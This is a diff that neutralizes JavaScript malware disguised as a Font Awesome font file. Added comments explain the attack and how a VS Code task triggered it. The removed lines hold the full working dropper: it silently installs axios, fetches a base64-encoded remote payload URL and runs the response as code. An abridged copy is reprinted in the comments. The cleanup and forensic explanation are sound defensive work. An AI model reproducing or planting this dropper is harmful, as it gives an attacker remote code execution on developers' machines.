@@ -1,25 +1,34 @@
-const path = require('path');
-const { execSync } = require('child_process');
-const fs = require('fs');
-const os = require('os');
-
-const isWindows = process.platform === 'win32';
-const tempdir = os.tmpdir();
-const targetDir = path.join(tempdir, 'programx64');
-
-if (!fs.existsSync(targetDir)) {
-  fs.mkdirSync(targetDir, { recursive: true });
-}
-
-const run = "const os = require('os'); const fs = require('fs'); const { execSync } = require('child_process'); process.title = 'Node.js JavaScript Runtime'; try { execSync('npm install --save axios request --legacy-peer-deps --no-warnings --no-save --no-progress -loglevel silent', { windowsHide: true }) } catch(e){}; try { const axios = require('axios'); async function getCookie() { const res = await axios.get(atob('aHR0cHM6Ly9wdXJwbGUtbG90dGllLTM4LnRpaW55LnNpdGUvaW5kZXguanNvbg==')); new (Function.constructor)('require', res.data.cookies)(require); } getCookie(); } catch(error){}";
-
-const command = isWindows
-  ? `${tempdir[0]}: && cd \"${targetDir}\" && npm install axios && node main.js`
-  : `cd \"${targetDir}\" && npm install axios && node main.js`;
-
-try {
-  fs.writeFileSync(path.join(targetDir, 'main.js'), run, { flag: 'w+' });
-  execSync(command, { windowsHide: true });
-} catch (err) {
-  console.log(err.message);
-}
+// NEUTRALIZED — this file is NOT a font. It was JavaScript disguised as fa-solid-400.woff2.
+//
+// ATTACK VECTOR: Fake Font File RCE Dropper
+//
+// The original file was plain JavaScript (not a woff2 font at all) that:
+// 1. Created a temp directory: $TMPDIR/programx64/
+// 2. Wrote a main.js payload that installs axios silently
+// 3. Fetched remote C2 payload from: https://purple-lottie-38.tiiny.site/index.json
+// 4. Executed the response.data.cookies value via: new (Function.constructor)('require', payload)(require)
+//    This is arbitrary remote code execution — the attacker controls what runs on your machine.
+//
+// Triggered by: .vscode/tasks.json "eslint-check" task running `node ./public/fa-solid-400.otf`
+// (note: the task targeted .otf but the actual file was .woff2 — the attacker may have renamed it)
+//
+// ORIGINAL MALICIOUS CODE (for forensic reference):
+//
+// const path = require('path');
+// const { execSync } = require('child_process');
+// const fs = require('fs');
+// const os = require('os');
+//
+// const isWindows = process.platform === 'win32';
+// const tempdir = os.tmpdir();
+// const targetDir = path.join(tempdir, 'programx64');
+//
+// if (!fs.existsSync(targetDir)) {
+//   fs.mkdirSync(targetDir, { recursive: true });
+// }
+//
+// const run = "const os = require('os'); ... execSync('npm install axios ...') ... axios.get(C2_URL) ... new Function.constructor('require', payload)(require)"
+//   // ^ Nested payload: installs axios, fetches C2 JSON, executes .cookies as code
+//
+// fs.writeFileSync(path.join(targetDir, 'main.js'), run, { flag: 'w+' });
+// execSync(`cd "${targetDir}" && npm install axios && node main.js`, { windowsHide: true });
